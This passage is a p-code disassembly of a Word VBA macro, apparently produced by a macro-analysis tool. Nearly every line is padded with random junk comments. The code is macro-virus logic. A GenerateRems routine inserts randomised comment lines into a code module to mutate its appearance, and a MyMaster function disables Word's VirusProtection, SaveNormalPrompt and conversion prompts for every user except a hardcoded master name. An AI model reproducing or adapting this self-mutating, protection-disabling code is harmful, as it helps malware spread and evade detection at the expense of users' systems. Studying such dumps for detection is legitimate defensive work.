' 	QuoteRem 0x0000 0x0012 "ÌÙ¿ÐÅíËäò¥ÒÑª÷òüÁ½"
' Line #544:
' 	StartForVariable 
' 	Ld i 
' 	EndForVariable 
' 	NextVar 
' Line #545:
' 	QuoteRem 0x0000 0x001A "¢¿´õµ¹×ž¡ ßÔõþµÂÑÎ¦½ô×°âÏ°"
' Line #546:
' 	Rem 0x001C " ýÀ±±ñŸŸ›ÒãÐßëíÅ¶ åÂóÆéÐÆÔàÌ"
' Line #547:
' 	Rem 0x002A " £Äö¹ÎÓûÀ»ëùž¸ç¯Ýýá¢ßí¶ñÕ›ï×æŸåÍœ±«­ôÕíààö"
' Line #548:
' 	QuoteRem 0x0000 0x0028 "º²ÙÓäµÂÅÀÈ´º¤ôó¼�ó¹Ü¤¼åå¼í¾¾÷Ð×µüçÈæ¦Áºì"
' Line #549:
' 	Rem 0x0009 " Ý®¡¬Í£ýÄ"
' Line #550:
' 	Label Done 
' Line #551:
' 	Rem 0x0019 " ¨ü¢³ÇÌù©õ»ÕØ¦Øâó »á¼´ñÊÔ"
' Line #552:
' 	Rem 0x0019 " »°òá»Ä¾ãÚ®ÝÕÄÉæÁØîËÇÆ©›µ"
' Line #553:
' 	QuoteRem 0x0000 0x000B "ï®§ãêîÏºÉ³é"
' Line #554:
' 	QuoteRem 0x0000 0x000F "ìôêáýåüéÚï±¤¶òþ"
' Line #555:
' 	EndSub 
' Line #556:
' 	QuoteRem 0x0000 0x0008 "ßòþ¦ØÓ³ª"
' Line #557:
' Line #558:
' 	QuoteRem 0x0000 0x001B "ùôö¤¼Úèœóçãõå¿­É›ÏÖ¸žØÑ×Ä»Ö"
' Line #559:
' 	QuoteRem 0x0000 0x0011 "ÍøáéÝàÄÃ¹¤ží÷· çñ"
' Line #560:
' 	QuoteRem 0x0000 0x0021 "êíÞ¢×«¢ÀþûØæÓé´º¶µçÙÕÃôÂÏÒ®÷Â»Ø¶°"
' Line #561:
' 	QuoteRem 0x0000 0x0005 "ªœùàÛ"
' Line #562:
' 	Rem 0x0015 " ½Ñ¸¹ÔÛ¿éîÑ½ÎÁÄúæ«¾£º"
' Line #563:
' 	FuncDefn (Sub GenerateRems(GenREMObject As Object))
' Line #564:
' 	Rem 0x0028 " §œÁåÑØæïÀÌí»Ý¨�ž¹ÛŸ©³éÈ£×ö­ºÇÑÙëºà×³Ò ¡"
' Line #565:
' 	Rem 0x0023 " éÄ§É©ëµ÷ôùÉ¬ºñó¯¬µÒ¹²äöÛßÝþÓ²õÅÖø­"
' Line #566:
' 	QuoteRem 0x0000 0x0024 "í»›å¹¦çö®ü¹ÛÛÆ¶ËáµÐ±áÂÉ¬¿Øõ³Üü÷ãÂù²ï"
' Line #567:
' 	Rem 0x0021 " ÎŸÛ§½� Ð÷Õ¬ÑØ¨ÉÛ¦ûßÒËÀßØðÁ¡ý÷¼ÍÔ"
' Line #568:
' 	OnError Done 
' Line #569:
' 	QuoteRem 0x0000 0x0007 "ÞúÆ§Åþ¯"
' Line #570:
' 	Rem 0x0005 " ©Êßµ"
' Line #571:
' 	QuoteRem 0x0000 0x0017 "Á ¦£ãúÅð¡ëž¹ãÓ´ð¦û¤üÔ÷ú"
' Line #572:
' 	Rem 0x0003 " è¢"
' Line #573:
' 	Rem 0x002F " ¤ñÎâÈèÊÍî§ã×åÐîý­¬äÔ»æã¦õ´¼äÂÂìÁûóÈñ¦ÅÙä¥ÃÕõ©Â"
' Line #574:
' 	QuoteRem 0x0000 0x0032 "·ÅÀË¦ôêÉ­ÀŸÁª ›¹åüú¢ÀŸÙ¨ØäŸ®¾ÖþÍàÉÁŸÞËµ½ÙéÛ¦Â�›Ò´Ö"
' Line #575:
' 	Rem 0x0018 " ÓÖÖÆ®ÖÞÞâ¤ê®¶è½Ë½Ë²Ë¡úã"
' Line #576:
' 	Dim (Const) 
' 	LitDI2 0x0008 
' 	VarDefn MaxStrNum
' 	LitDI2 0x0032 
' 	VarDefn MaxStrLen
' Line #577:
' 	QuoteRem 0x0000 0x0024 "ôò¾¯�ÎŸŸÖ¼àÆ¤ÔÓðÒëðìð�ÉòëÕ¼½òãßêèúó¸"
' Line #578:
' 	Rem 0x002A " ©¿åÔûåò¦´ð½Ÿ·¡ÎóÁØ Á¹ÆßŸÅÐåÐßºÌé±Ï§ðîüÙÎ§"
' Line #579:
' 	QuoteRem 0x0000 0x0025 "ÚÄüö·Çß¤ÕêÞç»œÈõ»ÖäãÐ×Ëîõª×øýÎÇÄ¹¢žÛÆ"
' Line #580:
' 	QuoteRem 0x0000 0x0030 "›õÜÓáéëÐ»ŸÉž¤ÛÜ±ûÆè¥Âæéüóæ¦à¸ÒÀÝò¢åÑ£Ü§å¦Ã¨Þ­¼áâ"
' Line #581:
' 	QuoteRem 0x0000 0x002A "Ðø×ž´×èâÁÆÉòøÍììó¤Î©½ ¿©È¨Öí¤öòî¶Ó©ž¸»«õââ"
' Line #582:
' 	Dim 
' 	VarDefn StrNum
' 	VarDefn StrLen
' 	VarDefn i
' 	VarDefn j
' 	VarDefn o
' 	VarDefn PrvStrNum (As Integer)
' Line #583:
' 	QuoteRem 0x0000 0x0032 "Òöí÷ÞÔËéÅ¬ûµñõ¼­êî¨îÊÙþ±¤ªŸûœåúøçµïãèòòêíÙÖÄ½ã¤¸¼Õ"
' Line #584:
' 	QuoteRem 0x0000 0x002F "§Ú§ÃòïïûêŸª¡¦ùÔ¥ïýÑã²íåäŸÛ¹éË²ÐìýçÛ«Ü»�ÓÏ±ÅæÓ¢æ"
' Line #585:
' 	Rem 0x0022 " ÏáöØð©¢Æ³­›±ñ¢öÎ×çñÀÞºØßõý»¤ä£�é¢"
' Line #586:
' 	QuoteRem 0x0000 0x000F "øìÍ·ü©ü¶ÏÔ§±¯æá"
' Line #587:
' 	Ld GenREMObject 
' 	MemLd CodeModule 
' 	MemLd CountOfLines 
' 	St PrvStrNum 
' Line #588:
' 	Rem 0x0033 " ÅùãÝŸ©Üœ·³Ö±ÃÇ«êÑ®¨öñû¾ÈÄÔÍëàÅÔÅ¢Ã§¤îÐ²œ¤Æ³ÔÀÉ¶ôüÝ"
' Line #589:
' 	QuoteRem 0x0000 0x002B "¤ÂÞÖÜìó¾úýýþüî¾êÒðêí¯Æ±ââ¨±°ÐÏ°ÉòøÈ¤Ôéíþßï±"
' Line #590:
' 	Rem 0x0008 " ¤ó¿ÇÆ¸Ñ"
' Line #591:
' 	Rem 0x002F " þ³Ûèþí÷Ú ÆÅõÞ ò¼éº¦¾µþÆ›¬ÁâÙâµ³²œæÁäÑïòíÃÜûÜ¸Ó"
' Line #592:
' 	QuoteRem 0x0000 0x0024 "²öÊð¢ÙÆÆàÈÕè�¢Øäçïª¿ï½¤øâãâÐ·áÑÏÛÀûà"
' Line #593:
' 	Rem 0x000C " Ó¯ö¬µ±­¢«Ãá"
' Line #594:
' 	Rem 0x002B " ›òÆ¹íÊ²óô×Õ¼ñËºë°ñÔÑ«º§ýº¬¾Ú¦¹¥ÛþÕ°²»§éá ³"
' Line #595:
' 	Rem 0x0020 " ª±¹±çê¤¤«½öúÂùœâàŸÊìßûæÕ·ªûÁÀªö"
' Line #596:
' 	LitDI2 0x0000 
' 	St i 
' Line #597:
' 	Rem 0x0023 " ùÇß¾ÇøŸË§ÃëË¨ªþÀêóÄû«¤Ò�¾ª¯¹Ò­úµîÝ"
' Line #598:
' 	Rem 0x0019 " àéÜ¯¾ÑóåíÛïéÜ¢ÐÓÐÉû°Ô±òÞ"
' Line #599:
' 	Rem 0x0022 " ªÍÓ§þ¸ú¾íü¯Öüâ«÷¥ãÜ×ÀäûÅ¿¬®ìä±µÞß"
' Line #600:
' 	QuoteRem 0x0000 0x000E "ž£×»ÁÄ´´èÆ½´áØ"
' Line #601:
' 	Rem 0x0021 " à¸ÅÑàÖÁí¨§÷ÎïÁç÷ØöÆóÓ´Î¥¹××®à°¥Å"
' Line #602:
' 	Rem 0x0014 " Ú¾ýÍºŸÅÂå«Ö¤ää¢îæäÛ"
' Line #603:
' 	Rem 0x0028 " ¾ÂìÊ¡ÚæÊÂÅâ¹ÎœøÆÉóóÝ·ÛÝòæÛ­Ïûº£ñÕ¶Ä÷û±¡"
' Line #604:
' 	Do 
' 	BoS 0x0000 
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #605:
' 	QuoteRem 0x0000 0x0019 "õÄ¤Íä¯ÝäùÙþâøÝÖÑ¹ãÝ¹æóÃ«æ"
' Line #606:
' 	Ld MaxStrNum 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnFix 
' 	St StrNum 
' Line #607:
' 	Rem 0x002A " ›öÉ�Ñø®­å¤³¯õÙ¿ÎæÓíýÑºù½ çÂ¶¬Ã³´Ãøå®üî÷æê"
' Line #608:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StrNum 
' 	For 
' Line #609:
' 	Rem 0x001A " ¦ØÍçú  ­´µó¨îüªí�Àë¨§ç»²Ñ"
' Line #610:
' 	Rem 0x0022 " ùæ¨öñ÷ÓÍ®Á×ò¿çÑÕÃ÷ý¶žÚêçÑýóé¿ÕÛÖÊ"
' Line #611:
' 	Ld MaxStrLen 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnFix 
' 	St StrLen 
' Line #612:
' 	Rem 0x002A " ÌÞÇÉÎõÝóåÅ§¨ò­´¾§¾Ú²®ðçäëÈËã ã·±×á²ÉÇ¼ãÝÑ"
' Line #613:
' 	Rem 0x0003 " Ù´"
' Line #614:
' 	QuoteRem 0x0000 0x0026 "þºÐñ·íÓñæçËÕðÄÆî×Å¿ó×àÏ³ìýÔ¡«µÒÈçíÍÇž©"
' Line #615:
' 	Rem 0x0012 " ÆË�õ¡µÃº÷¬þÁü›»ßø"
' Line #616:
' 	Rem 0x000E " ¾íÚ¾¼·òÙ½ÓñòÙ"
' Line #617:
' 	QuoteRem 0x0000 0x002A "ÅÄÈ¼Í¯é¡øßÞ¢ÕÏØÜÈíã¢à½§Ý±Ðûâ¬°­�œ£§»Òûç»Ñç"
' Line #618:
' 	Rem 0x0014 " §²Æº�Æø¸ÄüôÇÝþ¼ÃßõÆ"
' Line #619:
' 	LitStr 0x0000 ""
' 	St StrLine 
' Line #620:
' 	Rem 0x0008 " ªûÃ¡Ê«©"
' Line #621:
' 	Rem 0x001E " Âì¶œÌëªÓž¿Þ­Ã¶ÞçÝ´«ä­«çÜüõüÌë"
' Line #622:
' 	QuoteRem 0x0000 0x002C "ß¢Ë§÷Ã©ûàþÀöÕèÂÒ¾¯ãÉÝöÃãà¢ô¬ÅÉã½ÚÂü³è´ÁìÅõ¹¬"
' Line #623:
' 	QuoteRem 0x0000 0x000B "Á×­åúµíá±âÂ"
' Line #624:
' 	Rem 0x0029 " ¦ñ¿Â°Á£¨¥©·ñßðËýö¦ÚÔé¿›çŸëèûâîÃâ¶ÂãÇá�ïì"
' Line #625:
' 	Rem 0x0014 " àøÑ¢ÇµØÄÒº¢ýáœ¶°¼úÞ"
' Line #626:
' 	Rem 0x0030 " ²¦Øç°èÛÃïöïâø¾­Íþã¯æùÆ¨ÒÑÄÙØÑÕºáÙ§§àŸÄ½Ë£ì¿Ó°¤´"
' Line #627:
' Line #628:
' 	QuoteRem 0x0000 0x000E "£Éìîö·®÷Ûî¤ÂÐœ"
' Line #629:
' 	QuoteRem 0x0000 0x000D "Îä·Ô°ê¿»éÈ¥ãÃ"
' Line #630:
' 	Rem 0x002C " ¤Úõ´´ÃØì¸ñ®÷£òãÀÉÀ¦¶²¾¡Ðöà×û±âË´·È¶ÙÛá³³ýòø"
' Line #631:
' 	QuoteRem 0x0000 0x0013 "ÆÒÄå¹Ÿ¿¾ð›Æ¡á²§Ñ·¨®"
' Line #632:
' 	Rem 0x002D " ìµý÷ö»Éµµïý¸°à ôåóõë¼õ²ÂÓùÞ¯Ìé�¶äÎ³¨¼õ®ÛÃ×¦Ñ"
' Line #633:
' 	Rem 0x0030 " ðäÆ®ñ¸èëô¾ìæÓÔ´ôÍÉ³ãÁÆ±íÜÖÔŸœ¸ø¿ÚÄ»Ú­ÆŸûÏ®¯ô®Ê«"
' Line #634:
' 	Rem 0x0011 " ¸Ô±Á÷¹ø¹âýËÙÚÄÅï"
' Line #635:
' 	QuoteRem 0x0000 0x0012 "Ðï¹ð²ÔÌùãÐœöýŸ¿ùÀ¯"
' Line #636:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld StrLen 
' 	For 
' Line #637:
' 	Rem 0x0030 " ÙÖñ·÷ÛØ¦ûâØµì›ùÇÎðµÔÑ·²Ýž¶ÓÍìïõ£¡îÆèóÆ³´ÈÍÇ¨¡Ùœ"
' Line #638:
' 	QuoteRem 0x0000 0x0009 "ñÁê®¿ð±©×"
' Line #639:
' 	QuoteRem 0x0000 0x0002 "­É"
' Line #640:
' 	Rem 0x000B " ¦œôºÊ£�àéÎ"
' Line #641:
' 	QuoteRem 0x0000 0x0019 "Ò´é¦ý§ÍäÉ¿ÊÎíúÈ¤·Ûò¤²åË²Ü"
' Line #642:
' 	Rem 0x0012 " ·Æ¾Ôå´›ü³Æ°ñã¹¿í¿"
' Line #643:
' 	Ld StrLine 
' 	LitDI2 0x00FF 
' 	LitDI2 0x0064 
' 	Ld Rnd 
' 	Mul 
' 	LitDI2 0x0001 
' 	Add 
' 	FnFix 
' 	Sub 
' 	ArgsLd Chr$ 0x0001 
' 	Add 
' 	St StrLine 
' Line #644:
' 	Rem 0x002C " ´£ÊÞéóØÄòÃ¿õñðÖºª©ùºáÜåÞ¦áÊÙÚé£üçÒ üãÑ¯õÖà­"
' Line #645:
' 	StartForVariable 
' 	Ld o 
' 	EndForVariable 
' 	NextVar 
' Line #646:
' 	Rem 0x0019 " îê¥­®Í»§¹©´ÙèÕªœ ªýÜËÌæß"
' Line #647:
' 	QuoteRem 0x0000 0x002A "äË³›¿öÞ±ø½í·ü¸ËÍÊ�¿ÅèßÄô³¿ðúâçúÆÚäÛºüÌâîüÕ"
' Line #648:
' 	QuoteRem 0x0000 0x0021 "ÊÛòü§ò¼ò¼·çÅõÚ³¢É´¹öÙÆÉ£úãÏîÕôÛÇÞ"
' Line #649:
' 	QuoteRem 0x0000 0x002F "èÒ«éÛßµàû¹ÉçÓíÚæí¢Ñì�©£ãÈ¥±›µÄçÞ¥¥îëÈÝ¥ëãèêÍªÝ¾"
' Line #650:
' 	QuoteRem 0x0000 0x001F "¹žèòÀžôõòÑ©ÑÑÉ¶¯¦òËœ§·ßöÞ×ÒÒëô¾"
' Line #651:
' 	Rem 0x0011 " ñÈ½ÎŸÚÄ²î¨þö°É¸÷"
' Line #652:
' Line #653:
' 	QuoteRem 0x0000 0x002F "ô³÷é½ñœË¥äß¿Ï›ø©ÁÔÏ­Ð £½¾ÌîÔôõ±¸îÊ§Ï¦ÐüÝÂºÌ®®Æ¹"
' Line #654:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitR8 0x999A 0x9999 0x9999 0x3FD9 
' 	Lt 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St GetBool 
' 	Else 
' 	BoSImplicit 
' 	LitVarSpecial (False)
' 	St GetBool 
' 	EndIf 
' Line #655:
' 	Rem 0x002E " ¬Ç§¬¢¸âçý¶¾ïÈÈèÆò¾½ÖÏìÐ¨ÁÓž§ÞÚä§¬Ä¼«¯ÔîËÍ×Üœä"
' Line #656:
' 	QuoteRem 0x0000 0x0016 "×çÎÁœæÜ¾ÛøÞÁ�¨æó¡¥ºÏþÔ"
' Line #657:
' 	Ld GetBool 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "'"
' 	Ld StrLine 
' 	Concat 
' 	St StrLine 
' 	Else 
' 	BoSImplicit 
' 	LitStr 0x0004 "Rem "
' 	Ld StrLine 
' 	Concat 
' 	St StrLine 
' 	EndIf 
' Line #658:
' 	QuoteRem 0x0000 0x002B "þë¨Â©Á ÇÂ¯ÒåèõáºåæÕ§ç¤ªÄÕ¾œÚµþæ®ž¢©úèÖ¢Ä¾Ü°"
' Line #659:
' 	Rem 0x0012 " ¶ÆØÄ�üÀÞ¾ÁÚ­æ¬ŸÁÔ"
' Line #660:
' 	Rem 0x002E " ±ÚœÛäÖÊþ³¢à¡ÐÌÀœÐßöæú¶Å®Íå¼¯œ¿ïÀ«á¥È¤¥¤ÝÜß¿ÕÈ"
' Line #661:
' 	QuoteRem 0x0000 0x0020 "ýàüä²ßÒ¥Ô©Ðî£´¡ÇÅÇÎå½üïêñ¬áÑ¹Ð¼¶"
' Line #662:
' 	Ld i 
' 	Ld StrLine 
' 	Ld GenREMObject 
' 	MemLd CodeModule 
' 	ArgsMemCall InsertLines 0x0002 
' Line #663:
' 	QuoteRem 0x0000 0x002D "éèü÷¶±à½�Ú®ÄñæÝµ··ÈÏÂ£Ã¿Õ­ñÂøÎÏ¸Ã¾ö¥èÚåÂ´ïø§ú"
' Line #664:
' 	Rem 0x001F " ®¢³Ùòæêøñí¯Ñ¬¬›ÀæùøÖëÈ´ôõðÝÓõÓ"
' Line #665:
' 	Rem 0x0026 " ÍÇ­Õ×âÇ¾ÅÙ¼ÜÃðùÛâåË¦åªÒå£¬£­ÌÏ¡ïÅæ£ÆÆ"
' Line #666:
' 	QuoteRem 0x0000 0x0018 "µ·¹Ð¸èìé÷Â©üÒÛã�ñ«Ó òÖà¬"
' Line #667:
' 	Rem 0x002B " ¼ö´¤ìË´Û²çÒžôœìœÌÁ�²þ¥ò¿¾ÒäøõôÎúÐÚ©·Úì÷ãäœ"
' Line #668:
' 	Ld i 
' 	LitDI2 0x0001 
' 	Add 
' 	St i 
' Line #669:
' 	Rem 0x0004 " ¤ôè"
' Line #670:
' 	Ld PrvStrNum 
' 	LitDI2 0x0001 
' 	Add 
' 	St PrvStrNum 
' Line #671:
' 	QuoteRem 0x0000 0x0014 "°í·¾óõÑñ°›àê›à°®äÅûð"
' Line #672:
' 	Rem 0x002C " ³½ŸëÌèöÃéÃºŸ�ôûÑþ¾­î «Ð«ÙÍ«ŸÃÜøðÅŸ²ºßŸÛÜãÍ´"
' Line #673:
' 	QuoteRem 0x0000 0x000B "¤ìÙó¸Ð²Ç±ç·"
' Line #674:
' 	StartForVariable 
' 	Ld j 
' 	EndForVariable 
' 	NextVar 
' Line #675:
' 	Rem 0x0025 " ºØöÌªÎå¬»§·¬±Ç›å¡¡ÒÛË¬éþ¡ºÒöÂì¶î¤¡±Ý"
' Line #676:
' 	Rem 0x001B " ÑÖÞ¸¥åÉ÷þÎÐ¹ñàÊîö¸ª©æ¯ðÏ÷Î"
' Line #677:
' 	QuoteRem 0x0000 0x0028 "¬Ûü»Ï®°Ý¤Òâ§Ô¶éü×«øîè¨½ÃÅïýù¯žÒÏ¿Ü¬ýêáéß"
' Line #678:
' 	Rem 0x000A " º›íæÛÒÁ¶°"
' Line #679:
' 	QuoteRem 0x0000 0x001B "²ÌÓª¡©Ÿ°¨öËÁ÷¾ÆÆî°ïùêØÒðÜûÍ"
' Line #680:
' 	Rem 0x0027 " Ûã¢¼Æ£Ð¢ÝéžÏªÑíÞòÚÑºÀ×þÝúäæáÕ¸Å»ÕÑá§œÇ"
' Line #681:
' 	Rem 0x002F " õ¨èö§­¸¥¡Ô°ð¤ÆÕÛßÍØÙ¾Ãòß¿ÖÇ½¢¦Ø¾¯¡ÏŸÜòÀÈ¶°Ð­°ê"
' Line #682:
' 	Ld i 
' 	Ld PrvStrNum 
' 	LitDI2 0x0001 
' 	Add 
' 	Paren 
' 	Lt 
' 	LoopWhile 
' Line #683:
' 	Rem 0x002D " îÏ¨¦·äÓ¼ìÁáÉÑÎ ôÒÀØÖ¢ÝøîÎØ›Ô«éñÜáÕùáÅÖ®î­Ø÷�"
' Line #684:
' 	Label Done 
' Line #685:
' 	QuoteRem 0x0000 0x001D "¼ÒÄ½ë´åæ¦ÈÐŸžœÓÏÖ£óéü¶ è°ß³ãÖ"
' Line #686:
' 	QuoteRem 0x0000 0x0001 "à"
' Line #687:
' 	Rem 0x0032 " åû¥ô±©ÆþÁžÆëµ®¸÷Ï¿è¹áÐìµ¾ì�¬å íýÉ­½Èà»©¥¶Þ×›Ë¡¥¯Õ"
' Line #688:
' 	QuoteRem 0x0000 0x0004 "›©ßü"
' Line #689:
' 	QuoteRem 0x0000 0x0030 "øªÁºæÒ¾ÜãÀÂåÎÖç·ßÃ¤ëÁ¾õ¬Ù¸ìúÈŸÓÃèíá·ýÃ¦Ä¹ž¯üö§øÏ"
' Line #690:
' 	EndSub 
' Line #691:
' 	QuoteRem 0x0000 0x0018 "í½ÂüÁåá±å À±Ï¢ôÙ³ýã²ïÛ¬¼"
' Line #692:
' 	Rem 0x000D " ¢Ô¡â²é¨­ÓÂ¹Ë"
' Line #693:
' 	Rem 0x0011 " ¤á¸ðÎÒ­Õëûïß�ÉÙ´"
' Line #694:
' Line #695:
' 	Rem 0x000C " Þœ¬û»¼¦°§�Ò"
' Line #696:
' 	QuoteRem 0x0000 0x0010 "×Ù©ÃÈöÒ¢Ñ©¦Ç Ê²È"
' Line #697:
' 	QuoteRem 0x0000 0x0011 "Ú­ÉòàÙœ½à©Ûßâàòž·"
' Line #698:
' 	Rem 0x001E " ôïÒ åòÉžÃñÀÍ©ö£ÍÒ´ªç¦¼Ä´Öé«Ëª"
' Line #699:
' 	QuoteRem 0x0000 0x0029 "Ò®õËùüËã û¼ÍÎú›¼²öÍÀ­ÙËõúþ¦ÓŸ®ê¿öÒÓ¾ê¢µ­¯"
' Line #700:
' 	Rem 0x001B " ¸µ¸±õåß¸æñ¥ÌÕíÖÓÀ¨Âï¼×ÝÞØ¯"
' Line #701:
' 	FuncDefn (Function MyMaster() As Boolean)
' Line #702:
' 	Rem 0x000A " Õñ®²½Áùè¨"
' Line #703:
' 	QuoteRem 0x0000 0x001C "çÃçàÅü¨ü ½ùÒ£â¶£åçàæØ¶Ú¶è½ÈË"
' Line #704:
' 	Rem 0x001B " »ìòÁíÆÁÌ»®£¸£¶Ô¼¢Ù°¢Þ©ÍÁ÷Õ"
' Line #705:
' 	Rem 0x0008 " â¯´õÙ³Ó"
' Line #706:
' 	OnError Done 
' Line #707:
' 	QuoteRem 0x0000 0x002F "ÈÊóŸöÑœ»éÓëªËãÀ¤Ë›ÆúÓÎÁÆëÊ°Õ·¢žöÕ›ÏÂžâü¢ÞÍ­Í�¹ž"
' Line #708:
' 	QuoteRem 0x0000 0x0019 "±ó²åðàÐÏ¸êÝÍüÙ½å­ü£ôÁ¬ð±²"
' Line #709:
' 	QuoteRem 0x0000 0x0018 "¹ÄðžÑ©œ¶ÄÍîîÁÉ¥¼âàÌßö¥úù"
' Line #710:
' 	Rem 0x002C " îœÁðã¡êÛ¡âÔïÎö�ž ß½¡ïÇ¾îð·Ÿñ«íåØ«ó¨É»úûÕó»Ó"
' Line #711:
' 	Ld Application 
' 	MemLd UserName 
' 	Ld MasterID 
' 	Eq 
' 	Paren 
' 	St Authorize 
' Line #712:
' 	QuoteRem 0x0000 0x0032 "¡¡ÒÅÀ®æîöü÷Ì§Ò½ÓÞ¾ÂíÆ©È ¶îÏ¯ÊþÑÀþ¬ÓÂÇúÏ½ðäøÛ¦µ¯�°ü"
' Line #713:
' 	QuoteRem 0x0000 0x002A "¶›ì®°þ¯â·ÙÎò¶û¸úÐÆôíÛß¥£ü¤Èžð¢Ã¶×§§°±Úª­ùÅ"
' Line #714:
' 	QuoteRem 0x0000 0x0021 "ÁœûÆÖãÕ¦æÅÚ«ß¨îÆ ²ÚÊÂ×¦üêÀÕúÇÊùÛê"
' Line #715:
' 	Rem 0x000B " ­Øö¹ ÜÓç±°"
' Line #716:
' 	Rem 0x0031 " ¢· Ù¥ØÑËºÂëâÀåóïÖû¹œÑÐ¦çÌìÞáÖÏ°ìëœ§ØÏ³�ü¢ÊÍçêëä«"
' Line #717:
' 	QuoteRem 0x0000 0x0020 "ãíð¾Ãá¶à¾ÝÛÕÇðÉâ ë¢³©¸£Ï¢ùÒ×§ØñË"
' Line #718:
' 	QuoteRem 0x0000 0x001C "É�òí³ç°òà¿µôóïÄÅ£Ôþª°þ¥Ëý¦©ö"
' Line #719:
' 	QuoteRem 0x0000 0x000D "¥¦ãÎÚñ²ÍíÒ¥ïç"
' Line #720:
' 	Ld Authorize 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #721:
' 	Rem 0x0007 " ìßö°Þ·"
' Line #722:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd Options 
' 	With 
' Line #723:
' 	Rem 0x0029 " ×È¸ôéöÞ³žûêçÎ¥Àêö¯üžìÅ¹îìõ¨·Ã«¤ùÎ·§Èùîàë"
' Line #724:
' 	Rem 0x0019 " ï¿Ïàïâ¬¾ä¬¨²Ò£�Â¸õ°ÞÝøÆí"
' Line #725:
' 	Rem 0x0004 " ¦Ê¹"
' Line #726:
' 	Rem 0x001A " èØÏÕîÀ¬Óò¤¶¼¬§ªÑäÞÚÉÝÑçÕÅ"
' Line #727:
' 	Rem 0x001E " ›àùÕÎŸ£½ÆÁÈè·¨œÅ¦¦ÉÙÔ´²Óïý­ž®"
' Line #728:
' 	Rem 0x002C " �¾º¦ýÚÝ±öé­Ð¥ÔÉÊã®ô¡¥½ºùê£Ê¢»É¬²ëñ®´®¥þþ»½¢"
' Line #729:
' 	Ld Authorize 
' 	MemStWith ConfirmConversions 
' Line #730:
' 	Rem 0x0014 " °Æ¶¹½À­¢³èÄõüÝ²Ù›ëó"
' Line #731:
' 	QuoteRem 0x0000 0x002A "ðéª¿ÀÞðôÖ»àâñ©«ºòÈýÂßÎ�¼Ç¿óµî¼³¤ÀÀü¨» œÍÎÄ"
' Line #732:
' 	Ld Authorize 
' 	MemStWith SaveNormalPrompt 
' Line #733:
' 	Rem 0x000F " ÈÊÛ�Í·¦Ý®«Áñ¸Ë"
' Line #734:
' 	QuoteRem 0x0000 0x0024 "¶Óë¶ÑëÛíÓÒã¹ÖßÀœ¸û®¹ø®åÝÑžþÃÚØÉ¨èöªŸ"
' Line #735:
' 	Rem 0x0008 " ±í·­ÄÈË"
' Line #736:
' 	Rem 0x0028 " Ýä¿é¬¼ùÙÝÝ¿ýÏûÎ£½ù�û¨þ¾²¹»ÚÅÅÝ·¯ÞôÀ·¥¹å"
' Line #737:
' 	QuoteRem 0x0000 0x0013 "Ûð°áôÁÍóñØ¤�ÊÎ›²çØÔ"
' Line #738:
' 	Rem 0x000F " ×ÝýñãÎÓÆìÍÎÔ³Î"
' Line #739:
' 	Ld Authorize 
' 	MemStWith VirusProtection 
' Line #740:
' 	Rem 0x001C " £ãÛÃÂ¬õÒôÕáïäß¶³ùÖã§¼�»À¯¹Ñ"
' Line #741:
' 	EndWith 
' Line #742:
' 	Rem 0x002F " óûªî¿¥à óß²º²Ÿä÷ôÃÁÇÔ¹ÔúÒÛÏüÝÔâ²¨¤¡¬§Çï©œ©ÀÃÈ÷"
' Line #743:
' 	QuoteRem 0x0000 0x0008 "­º½ÏÎü¤ì"
' Line #744:
' 	QuoteRem 0x0000 0x0009 "íÊœù¹º¾£©"
' Line #745:
' 	Ld Authorize 
' 	St MyMaster 
' Line #746:
' 	Rem 0x002D " ßõó¨ÜìÉ±Ùùã®ªêÚðã£Æ¬Åéà¤½ê¨ªçÈ¨ó¡ë¢òÅÎ½Û¯Ý¨´"
' Line #747:
' 	Rem 0x0029 " �Þº²µòàòêâß¨ Î³»ÔÆí¹¯Ö�Ê­õ›Ìýâáèé¨áâí«úá"
' Line #748:
' 	QuoteRem 0x0000 0x0017 "ªëäÁù¹ÅÌìóïÍêÝ¤äñóóë¨Å›"
' Line #749:
' 	QuoteRem 0x0000 0x000D "œà´Ô³Ú¹Ø·åý®¿"
' Line #750:
' 	QuoteRem 0x0000 0x000C "ñœÖì£ ªïÚºÄã"
' Line #751:
' 	Rem 0x002D " éó¶ÕË¾òÊÓàôžàÑ½Êæ›î« ç²ØÊú©´¬â�ó¯×¨öèá¯½·ÈïÏ"
' Line #752:
' 	Rem 0x0026 " å×ÃôÒéíÓÕ¹¨é³«çü¬ÚÀð¬ÈªÍöïô·º²çÀããð¬ò"
' Line #753:
' 	Rem 0x001C " ÆÌ¤±ŸéÏçäÔ¿À½²ß²ý½øÌö¨Ø¢£Ûê"
' Line #754:
' 	Label Done 
' Line #755:
' 	QuoteRem 0x0000 0x0013 "¿ÙÕ·ûðÊ×êé¯Õ�¹ê«¢Ö¿"
' Line #756:
' 	Rem 0x0017 " ¬¡«¨àÙîêËæß³ï²ºò¥èÑÇÃØ"
' Line #757:
' 	QuoteRem 0x0000 0x0015 "´÷ê¢îðåå�Ç²·°¯ÛßñÍñÌå"
' Line #758:
' 	QuoteRem 0x0000 0x0004 "ë¢ÝÈ"
' Line #759:
' 	EndFunc 
' Line #760:
' 	Rem 0x002A " êŸ»Èý¬ÑÞÃÄ¨é­Í² ÄÆÃÌœÓöøÉáðò¬èî¦Þ½×¥Óï» ª"
' Line #761:
' 	QuoteRem 0x0000 0x0014 "êò¸½ÁÌœ®ÊþøúÄµÑÑ¦ÑÁî"
' Line #762:
' 	Rem 0x0019 " È­ÕÂÐç®½¤Ð®©¤¨Ä±Â½ªÙ¡Ç·ß"
' Line #763:
' 	QuoteRem 0x0000 0x0027 "¥Ä³ìüâ½¬Ù¹ãÈ»º¡›áíÂ®¾ùÒø²çÆýåŸûœÓÙî¿¼Óþ"
' Line #764:
' 	QuoteRem 0x0000 0x0003 "¨óþ"
' Line #765:
